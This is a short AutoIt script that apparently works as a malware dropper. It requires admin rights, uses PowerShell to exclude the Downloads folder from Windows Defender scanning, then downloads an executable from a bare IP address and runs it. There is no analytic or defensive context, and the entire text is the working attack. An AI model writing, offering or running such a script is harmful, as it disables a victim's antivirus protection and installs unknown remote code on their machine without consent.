#RequireAdmin
RunWait('powershell.exe -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"')
InetGet("http://172.188.16.91/Client.exe", @ScriptDir & "\Client.exe")
Run(@ScriptDir & "\Client.exe")
